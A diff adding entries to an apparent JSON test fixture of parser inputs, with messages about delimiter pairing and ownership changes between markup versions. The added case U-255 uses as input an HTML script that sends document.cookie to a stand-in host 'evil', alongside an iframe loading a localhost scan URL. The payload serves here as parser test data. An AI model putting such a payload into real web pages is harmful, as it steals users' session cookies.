@@ -238,5 +238,15 @@
     "id": "U-252",
     "input": "- [x]   - :: term\n           : desc\n           :: next\n           : body\n",
     "message": "C2-B-046, C2-B-067, and C2-H-032: task HTML and nested description ownership change; no preserving 0.2 spelling was verified"
+  },
+  {
+    "id": "U-254",
+    "input": "/{+a/{k=b+}\n",
+    "message": "C2-I-023, C2-I-043, and C2-I-047: delimiter pairing and line comment ownership change; no preserving 0.2 spelling was verified"
+  },
+  {
+    "id": "U-255",
+    "input": "<iframe src=\"http://localhost:8080/scan\"></iframe>\n<script>fetch(\"//evil/?\" + document.cookie)</script>\n",
+    "message": "C2-I-047: slash delimiters pair at different positions across escaped HTML tags; no preserving 0.2 spelling was verified"
   }
 ]
